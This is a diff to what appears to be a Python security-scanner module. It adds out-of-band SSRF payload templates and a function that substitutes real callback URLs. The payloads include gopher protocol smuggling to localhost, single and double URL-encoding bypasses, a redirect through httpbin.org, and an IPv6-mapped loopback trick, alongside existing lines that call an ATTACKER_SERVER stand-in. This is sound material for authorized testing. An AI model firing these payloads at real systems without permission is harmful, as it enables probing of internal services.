@@ -208,3 +208,103 @@ SSRF_OOB_PAYLOADS = [
     {"payload": "http://ATTACKER_SERVER:8080/ssrf-test", "description": "OOB callback alt port"},
     {"payload": "https://ATTACKER_SERVER/ssrf-test", "description": "HTTPS OOB callback"},
 ]
+
+
+# OAST (Out-of-Band Application Security Testing) payload templates
+# These templates have {CALLBACK} placeholder that gets replaced with actual callback URL
+SSRF_OAST_TEMPLATES = [
+    # Direct HTTP callbacks
+    {
+        "template": "{CALLBACK}",
+        "description": "Direct HTTP callback",
+        "method": "GET",
+    },
+    {
+        "template": "{CALLBACK}?data=ssrf-test",
+        "description": "HTTP callback with query param",
+        "method": "GET",
+    },
+    # DNS-based callbacks
+    {
+        "template": "http://{DNS_CALLBACK}/",
+        "description": "DNS callback via HTTP",
+        "method": "DNS",
+    },
+    # Protocol smuggling with callbacks
+    {
+        "template": "gopher://127.0.0.1:80/_GET%20/{CALLBACK_PATH}%20HTTP/1.0%0d%0a",
+        "description": "Gopher protocol HTTP smuggling",
+        "method": "GOPHER",
+    },
+    # URL encoding bypass with callback
+    {
+        "template": "{CALLBACK_ENCODED}",
+        "description": "URL encoded callback",
+        "method": "ENCODED",
+    },
+    # Double URL encoding
+    {
+        "template": "{CALLBACK_DOUBLE_ENCODED}",
+        "description": "Double URL encoded callback",
+        "method": "DOUBLE_ENCODED",
+    },
+    # Redirect-based callbacks
+    {
+        "template": "http://httpbin.org/redirect-to?url={CALLBACK_ENCODED}",
+        "description": "Redirect to callback",
+        "method": "REDIRECT",
+    },
+    # IPv6 callback
+    {
+        "template": "http://[::ffff:127.0.0.1]/?callback={CALLBACK_ENCODED}",
+        "description": "IPv6 mapped with callback param",
+        "method": "IPV6",
+    },
+]
+
+
+def generate_oast_payloads(callback_url: str, dns_callback: str = None) -> list:
+    """
+    Generate SSRF payloads with actual OAST callback URLs.
+
+    Args:
+        callback_url: HTTP callback URL from OAST client
+        dns_callback: DNS callback domain from OAST client
+
+    Returns:
+        List of payload dictionaries ready for injection
+    """
+    import urllib.parse
+
+    payloads = []
+
+    # Parse callback URL for components
+    parsed = urllib.parse.urlparse(callback_url)
+    callback_path = parsed.path if parsed.path else "/callback"
+    callback_encoded = urllib.parse.quote(callback_url, safe='')
+    callback_double_encoded = urllib.parse.quote(callback_encoded, safe='')
+
+    for template in SSRF_OAST_TEMPLATES:
+        payload_str = template["template"]
+
+        # Replace placeholders
+        payload_str = payload_str.replace("{CALLBACK}", callback_url)
+        payload_str = payload_str.replace("{CALLBACK_PATH}", callback_path)
+        payload_str = payload_str.replace("{CALLBACK_ENCODED}", callback_encoded)
+        payload_str = payload_str.replace("{CALLBACK_DOUBLE_ENCODED}", callback_double_encoded)
+
+        if dns_callback:
+            payload_str = payload_str.replace("{DNS_CALLBACK}", dns_callback)
+        else:
+            # Skip DNS-based templates if no DNS callback provided
+            if "{DNS_CALLBACK}" in template["template"]:
+                continue
+
+        payloads.append({
+            "payload": payload_str,
+            "description": template["description"],
+            "method": template["method"],
+            "is_oast": True,
+        })
+
+    return payloads
